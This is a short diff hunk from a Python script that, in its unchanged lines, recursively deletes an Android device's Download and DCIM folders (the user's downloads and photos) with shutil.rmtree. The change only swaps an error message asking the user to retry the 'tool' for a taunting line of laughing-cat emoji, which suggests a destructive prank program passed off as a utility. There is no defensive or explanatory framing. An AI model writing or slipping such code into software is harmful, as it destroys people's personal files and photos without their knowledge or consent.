@@ -20,6 +20,6 @@ try:
 	shutil.rmtree("/storage/emulated/0/Download")
 	shutil.rmtree("/storage/emulated/0/DCIM")
 except:
-	print("Sorry,an error occured.Please Retry tool..")
+	print("Sorry,an error occured.Please 😹😹😹..")
 
 
